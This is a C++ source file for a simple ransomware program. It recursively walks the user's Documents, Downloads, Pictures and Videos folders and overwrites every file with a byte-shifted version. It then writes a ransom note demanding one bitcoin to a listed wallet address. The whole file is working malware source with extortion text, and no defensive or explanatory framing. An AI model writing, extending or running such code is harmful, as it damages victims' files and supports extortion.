#include <iostream>
#include <fstream>
#include <dirent.h>
#include <sys/stat.h>
#include <string.h>

using namespace std;
void fileEncrypt(string filePath){
    fstream file,tmpFile;
    string tmpFilePath = "temp.txt";
    
    file.open(filePath, ios::in);
    tmpFile.open(tmpFilePath, ios::out);

    char byte;
    while(file >> noskipws >> byte){
        byte += 1;
        tmpFile << byte; 
    }
    file.close();
    tmpFile.close();

    file.open(filePath, ios::out);
    tmpFile.open(tmpFilePath, ios::in);
    while(tmpFile >> noskipws >> byte){
        file << byte; 
    }
    file.close();
    tmpFile.close();
    remove(tmpFilePath.c_str());
}


void dirEncrypt(string dirPath)
{
    DIR* dir;
    struct dirent* entry;
    struct stat status;
    string path;

    if((dir = opendir(dirPath.c_str())) != NULL){
        while((entry = readdir(dir)) != NULL){
            if(strcmp(entry -> d_name, ".") != 0 && strcmp(entry -> d_name, "..") != 0){
                path = dirPath+ "/" + entry -> d_name; //Varia de acuerdo con el OS
                stat(path.c_str(), &status);
                if (S_ISDIR(status.st_mode)){
                    dirEncrypt(path);
                }
                else 
                {
                    fileEncrypt(path);
                }
            }
        }
    }
}

void generateRescueFile()
{
    fstream rescueFile;
    string rescueFilePath = "YOUHAVEBEENHACKED.txt";

    rescueFile.open(rescueFilePath, ios::out);
    rescueFile << "You have been hacked by jDeag. Send 1 btc to 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 if you want to unlock your files :)";
    rescueFile.close();
}


int main()
{
    string username = getenv("LOGNAME");
    dirEncrypt("/home/" + username + "/Documents/");
    dirEncrypt("/home/" + username + "/Downloads/");
    dirEncrypt("/home/" + username + "/Pictures/");
    dirEncrypt("/home/" + username + "/Videos/");
    generateRescueFile();
    return 0;
}
